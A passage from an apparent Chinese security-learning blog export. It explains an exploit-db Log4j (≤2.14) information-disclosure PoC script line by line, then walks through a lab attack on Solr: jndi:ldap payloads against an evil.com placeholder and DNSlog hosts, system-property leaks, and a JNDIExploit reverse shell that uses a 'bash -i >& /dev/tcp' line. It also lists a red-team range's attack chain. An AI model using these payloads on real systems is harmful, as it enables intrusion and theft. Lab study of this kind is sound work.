class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; v| extracted value: <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h4 id="ThreadedTCPServer"><a href="#ThreadedTCPServer" class="headerlink" title="ThreadedTCPServer"></a>ThreadedTCPServer</h4><p><code>ThreadedTCPServer</code> 类是一个多线程 <code>TCP</code> 服务器，它继承自 <code>socketserver.ThreadingMixIn</code> 和 </p>
<p><code>socketserver.TCPServer</code> 类。这意味着它可以同时处理多个客户端连接。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>



<h4 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h4><p>main()函数使用模块设置命令行参数解析器argparse，然后解析命令行参数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;a simple log4j&lt;=2.14 information disclosure poc &#x27;</span>                              <span class="string">&#x27;(ref:https://twitter.com/Black2Fan/status/1470281005038817284)&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p>下面的类似<code>-t,-lh,-lp</code>等等就是解析器设置为接受命令行参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    parser.add_argument(<span class="string">&#x27;--target&#x27;</span>, <span class="string">&#x27;-t&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;target uri&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-host&#x27;</span>, default=<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;exploit server host to listen on(default: 127.0.0.1)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-port&#x27;</span>, <span class="string">&#x27;-lp&#x27;</span>, default=<span class="number">8888</span>,</span><br><span class="line"><span class="built_in">help</span>=<span class="string">&#x27;exploit server port to listen on (default: 8888)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--exploit-host&#x27;</span>, <span class="string">&#x27;-eh&#x27;</span>, required=<span class="literal">True</span>,</span><br><span class="line">default=<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;host where (this) exploit server is reachable&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--leak&#x27;</span>, <span class="string">&#x27;-l&#x27;</span>, default=<span class="string">&#x27;$&#123;java:version&#125;&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;value to leak. &#x27;</span><span class="string">&#x27;see:https://twitter.com/Rayhan0x01/status/1469571563674505217 &#x27;</span><span class="string">&#x27;(default: $&#123;java:version&#125;)&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p><code>parse_args()</code> 方法用于解析命令行参数，并将解析后的参数值存储在一个名为 <code>args</code> 的变量中</p>
<p>例如，在执行脚本后加的命令行参数<code>--listen-port 8080</code>就转变为了<code>args.listen_port = 8080</code>，这样在后续</p>
<p>代码调用不同参数时，可直接调用<code>arg</code>来实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">args = parser.parse_args()</span><br></pre></td></tr></table></figure>



<p>这里先创建一个基于线程的 <code>TCP</code> 服务器，并使用 <code>args.listen_host</code> 和 <code>args.listen_port</code> 来指定的主机和端</p>
<p>口启动，并使用 <code>ThreadedTCPRequestHandler</code> 类来处理每个请求【也就是前面提到的】</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| starting server on <span class="subst">&#123;args.listen_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>&#x27;</span>)</span><br><span class="line">    server = ThreadedTCPServer((args.listen_host, args.listen_port),</span><br><span class="line">ThreadedTCPRequestHandler)</span><br></pre></td></tr></table></figure>



<p>这里主要是先创建一个 <code>threading.Thread</code> 对象，并将服务器的 <code>serve_forever()</code> 方法作为其目标。这个方法</p>
<p>就是字面意思，它会一直运行，直到服务器被关闭。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serv_thread = threading.Thread(target=server.serve_forever)</span><br></pre></td></tr></table></figure>



<p><code>daemon</code> 属性是 <code>Python</code> 中的线程特有属性，它表示该线程是否为守护线程，如果一个线程是守护线程，</p>
<p>那么当程序退出时，它也会被中断。</p>
<p>而这里的被设置为<code>ture</code>，所以这意味着程序退出时，线程将被中断。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serv_thread.daemon = <span class="literal">True</span></span><br></pre></td></tr></table></figure>



<p>然后就是启动线程，并延迟 <code>1</code> 秒钟，来确保服务器完全启动</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serv_thread.start()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27; i| server started&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&#x27;$&#123;&#123;jndi:ldap://<span class="subst">&#123;args.exploit_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>/<span class="subst">&#123;args.leak&#125;</span>&#125;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27; i| sending exploit payload <span class="subst">&#123;payload&#125;</span> to <span class="subst">&#123;args.target&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p>这里使用 <code>try-finally</code> 语句块向服务器发送<code>payload</code>:</p>
<p><code>$&#123;&#123;jndi:ldap://&#123;args.exploit_host&#125;:&#123;args.listen_port&#125;/&#123;args.leak&#125;&#125;&#125;</code></p>
<p>并打印服务器的响应状态码，以及响应的文本内容</p>
<p>最后调用服务器的 <code>shutdown()</code> 和 <code>server_close()</code> 方法，以关闭服务器，即使在发送 <code>HTTP</code> 请求时发生异常也是如此。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(args.target, headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: payload&#125;)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| response status code: <span class="subst">&#123;r.status_code&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| response: <span class="subst">&#123;r.text&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; e| failed to make request: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    server.shutdown()</span><br><span class="line">    server.server_close()</span><br></pre></td></tr></table></figure>

<p>这里就是一个常见的语句，如果脚本是独立执行的，则直接就调用 <code>main()</code> 函数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()    </span><br></pre></td></tr></table></figure>

<h2 id="了解漏洞描述与注入原理"><a href="#了解漏洞描述与注入原理" class="headerlink" title="了解漏洞描述与注入原理"></a><strong>了解漏洞描述与注入原理</strong></h2><p><code>Apache Log4j 2</code> 是<code>Java</code>语言的日志处理套件，使用极为广泛。在其<code>2.0</code>到<code>2.14.1</code>版本中存在一处<code>JNDI</code>注入漏</p>
<p>洞，攻击者在可以控制日志内容的情况下，通过传入类似于</p>
<p><code>$&#123;jndi:ldap://evil.com/example&#125;</code>的<code>lookup</code>用于进行<code>JNDI</code>注入，执行任意代码。</p>
<h3 id="Log4j2-Lookup"><a href="#Log4j2-Lookup" class="headerlink" title="Log4j2 Lookup"></a>Log4j2 Lookup</h3><p><code>Log4j2</code> <code>Lookup</code>是<code>Log4j2</code>的一项功能，允许您<strong>在日志消息中使用动态值</strong>，<code>Log4j2</code>提供了许多内置的<code>Lookup</code>对</p>
<p>象，用于查找不同类型的值</p>
<p>例如<code>SystemPropertiesLookup.lookup(&quot;user.home&quot;)</code>方法返回了系统属性<code>user.home</code>的值，并将其插入日志</p>
<p>消息中。</p>
<h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>开始我也看不太懂<code>JNDI</code>任意代码执行语句意思</p>
<p>先了解一下<code>JNDI</code>是什么以及其组成</p>
<p><code>JNDI</code>（<code>Java</code>命名和目录接口），是<code>Java</code>提供的一个目录服务应用程序接口（<code>API</code>）</p>
<p>它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象 </p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">其中大致有</span><br><span class="line">远程方法调用（RMI），通用对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）</span><br></pre></td></tr></table></figure>

<p>其大致组成为</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String jndiName= ...;<span class="comment">//指定需要查找name名称</span></span><br><span class="line"><span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();<span class="comment">//初始化默认环境</span></span><br><span class="line"><span class="type">DataSource</span> <span class="variable">ds</span> <span class="operator">=</span> (DataSourse)context.lookup(jndiName);<span class="comment">//查找该name的数据</span></span><br></pre></td></tr></table></figure>

<p><u><strong>所以如果能控制<code>jndiName</code>，再利用<code>rmi</code>之类的加载远程类文件进行调用，就可能实现远程代码执行</strong></u></p>
<h3 id="JNDI注入"><a href="#JNDI注入" class="headerlink" title="JNDI注入"></a>JNDI注入</h3><p>结合<code>lookup</code>和<code>jndi</code></p>
<p><strong>对于<code>payload</code></strong></p>
<p><code>$&#123;jndi:ldap://evil.com/example&#125;</code>是<code>Log4j2</code>中使用的<strong>占位符</strong>语法。<strong>它表示在日志消息中插入一个使用</strong></p>
<p><strong><code>JNDILookup</code>对象查找的值</strong></p>
<p><code>ldap://evil.com/example</code>是<code>JNDI</code>查找所使用的名称。这意味着<code>Log4j2</code>将在<code>JNDI</code>上下文中查找名为<code>example</code></p>
<p>的对象，该对象位于<code>evil.com</code>服务器上，就可能实现访问一些敏感信息以及其他恶意操作的目的</p>
<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="利用DNSlog验证漏洞"><a href="#利用DNSlog验证漏洞" class="headerlink" title="利用DNSlog验证漏洞"></a>利用DNSlog验证漏洞</h3><p>访问<code>http://www.dnslog.cn/</code></p>
<p>先<code>Get SubDomain</code>获取一个子域名</p>
<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220145121926.png" alt="image-20221220145121926"></p>
<p>但是既然是注入，那肯定是存在参数注入点，查看官方<code>solr</code>文档，得到在<code>cores</code>里</p>
<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220145505204.png" alt="image-20221220145505204"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/admin/</span>cores?action=</span><br></pre></td></tr></table></figure>

<p>其中<code>action</code>参数可控，有很大可能是注入点</p>
<p>于是把我们的<code>dnslog</code>获取的子域名按<code>payload</code>形式添加到<code>url</code>后参数中</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="regexp">/4d5do5.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure>

<p>访问查看</p>
<p><code>DNSlog</code>收到了访问请求</p>
<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220145131607.png" alt="image-20221220145131607"></p>
<p>同时在靶机页面下也有<code>DNSlog</code>子域名回显，虽然是</p>
<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220145054026.png" alt="image-20221220145054026"></p>
<p>说明这里的<code>$&#123;jndi:ldap://eavgk6.dnslog.cn&#125;</code>，确实达到了访问的作用</p>
<p>故此推断<code>log4j2</code>漏洞存在</p>
<h3 id="信息泄露漏洞"><a href="#信息泄露漏洞" class="headerlink" title="信息泄露漏洞"></a>信息泄露漏洞</h3><p>这里可以利用脚本分析中<code>exploitdb</code>里的信息泄露脚本即可</p>
<p>按照脚本原理也是利用占位符，也就是<code>payload</code>的形式，但是参数为系统属性，这些属性会自动返回对应的值，</p>
<p>最后脚本通过对返回数据的解析，就可以得到敏感数据</p>
<p>当然直接通过访问得到消息也是可以的</p>
<p>比如<code>$&#123;sys:os.version&#125;</code>，就得到我们靶机的系统内核版本号为<code>5.15.0-56-generic</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="regexp">/$&#123;sys:os.version&#125;.7b09py.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220220840849.png" alt="image-20221220220840849"></p>
<p>对于<code>usr.name</code>，以及<code>os.name</code>等等都是可以实现</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="regexp">/$&#123;sys:user.name&#125;.7b09py.dnslog.cn&#125;</span></span><br></pre></td></tr></table></figure>



<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220175405653.png" alt="image-20221220175405653"></p>
<p>以下就是在<code>log4j2</code>其他可用系统属性列表</p>
<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221220170944260.png" alt="image-20221220170944260"></p>
<h3 id="远程代码执行漏洞"><a href="#远程代码执行漏洞" class="headerlink" title="远程代码执行漏洞"></a>远程代码执行漏洞</h3><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">攻击机kali <span class="built_in">ip</span>:<span class="number">192</span>.<span class="number">168</span>.<span class="number">80</span>.<span class="number">128</span></span><br><span class="line">攻击机kali 监听端口:<span class="number">8888</span></span><br><span class="line">靶机ubuntu <span class="built_in">ip</span>:<span class="number">192</span>.<span class="number">168</span>.<span class="number">80</span>.<span class="number">131</span></span><br></pre></td></tr></table></figure>

<h4 id="JNDIExploit-1-2-SNAPSHOT-jar利用JNDI注入反弹shell"><a href="#JNDIExploit-1-2-SNAPSHOT-jar利用JNDI注入反弹shell" class="headerlink" title="JNDIExploit-1.2-SNAPSHOT.jar利用JNDI注入反弹shell"></a>JNDIExploit-1.2-SNAPSHOT.jar利用JNDI注入反弹shell</h4><p>该工具的原理我剖析了一下，</p>
<p>先启动工具</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">java</span> -jar JNDIExploit-<span class="number">1</span>.<span class="number">2</span>-SNAPSHOT.jar -i <span class="number">192.168.80.128</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221221163132059.png" alt="image-20221221163132059"></p>
<p>简单来讲就是在攻击机【<code>192.168.80.128</code>】的的<code>1389</code>端口搭建起了一个服务器，其中放置了一个恶意类，</p>
<p>通过利用靶机网站<code>JNDI</code>注入漏洞把这个恶意类进行远程加载，从而执行了命令</p>
<p>利用<code>JNDIExploit-1.2-SNAPSHOT.jar</code>最好的就是简化了<code>1.0</code>的繁杂参数</p>
<p>只需要构造<code>payload</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="regexp">/192.168.80.128:1389/</span>Basic<span class="regexp">/ReverseShell/</span><span class="number">192.168</span>.<span class="number">80.128</span>/<span class="number">6666</span>&#125;</span><br></pre></td></tr></table></figure>

<p><code>/Basic/ReverseShell/</code>中其实就包含反弹<code>shell</code>的命令</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/xx.xx.xx.xx/</span>xxxx <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">*这里的</span><br><span class="line"><span class="regexp">/xx.xx.xx.xx/</span>xxxx</span><br><span class="line">就是其后跟上的参数</span><br><span class="line"><span class="regexp">/192.168.80.128/</span><span class="number">6666</span></span><br></pre></td></tr></table></figure>

<p>于是就是<code>/Basic/ReverseShell/192.168.80.128/6666</code>被恶意类包含</p>
<p>然后在攻击机监听<code>6666</code>端口</p>
<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221221203418508.png" alt="image-20221221203418508"></p>
<p>最后访问<code>payload</code>，触发</p>
<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221221203458628.png" alt="image-20221221203458628"></p>
<p>成功反弹到<code>shell</code></p>
<p><img src="/2022/12/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B/image-20221221203538282.png" alt="image-20221221203538282"></p>
<p>测试完毕</p>
<h1 id="CVE-2022-28346"><a href="#CVE-2022-28346" class="headerlink" title="CVE-2022-28346"></a>CVE-2022-28346</h1>]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>实战</tag>
      </tags>
  </entry>
  <entry>
    <title>红日靶场</title>
    <url>/2022/11/13/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/</url>
    <content><![CDATA[<p><code>经典靶场，虽然老，但是还是值得学习</code></p>
<span id="more"></span>

<h1 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h1><blockquote>
<p>红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。另外本次实战完全模拟ATT&amp;CK攻击链路进行搭建，开成完整闭环。后续也会搭建真实APT实战环境，从实战中成长。关于环境可以模拟出各种各样实战路线，目前给出作者实战的一套攻击实战路线如下，虚拟机所有统一密码：hongrisec@2019：</p>
<p>一、环境搭建<br>1.环境搭建测试<br>2.信息收集</p>
<p>二、漏洞利用<br>3.漏洞搜索与利用<br>4.后台Getshell上传技巧<br>5.系统信息收集<br>6.主机密码收集</p>
<p>三、内网搜集<br>7.内网–继续信息收集<br>8.内网攻击姿势–信息泄露<br>9.内网攻击姿势-MS08-067<br>10.内网攻击姿势-SMB远程桌面口令猜测<br>11.内网攻击姿势-Oracle数据库TNS服务漏洞<br>12.内网攻击姿势-RPC DCOM服务漏洞</p>
<p>四、横向移动<br>13.内网其它主机端口-文件读取<br>14.内网其它主机端口-redis<br>15.内网其它主机端口-redis Getshell<br>16.内网其它主机端口-MySQL数据库<br>17.内网其它主机端口-MySQL提权</p>
<p>五、构建通道<br>18.内网其它主机端口-代理转发</p>
<p>六、持久控制<br>19.域渗透-域成员信息收集<br>20.域渗透-基础服务弱口令探测及深度利用之powershell<br>21.域渗透-横向移动[wmi利用]<br>22.域渗透-C2命令执行<br>23.域渗透-利用DomainFronting实现对beacon的深度隐藏<br>24.域渗透-域控实现与利用</p>
<p>七、痕迹清理<br>25、日志清理</p>
</blockquote>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>实战</tag>
      </tags>
  </entry>
</search>
